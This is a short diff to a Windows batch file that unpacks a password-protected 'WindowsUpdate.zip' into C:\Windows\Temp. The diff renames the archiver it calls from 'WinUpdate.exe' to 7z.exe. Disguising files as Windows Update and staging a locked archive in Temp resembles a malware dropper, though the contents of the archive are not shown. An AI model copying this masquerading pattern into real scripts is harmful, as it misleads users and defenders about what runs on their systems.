@@ -1,2 +1,2 @@
 @echo off
-cmd /c "C:\Windows\Temp\WinUpdate.exe x WindowsUpdate.zip -oC:\Windows\Temp -pMicrosoft_Windows_Update -aos"
+cmd /c "C:\Windows\Temp\7z.exe x WindowsUpdate.zip -oC:\Windows\Temp -pMicrosoft_Windows_Update -aos"
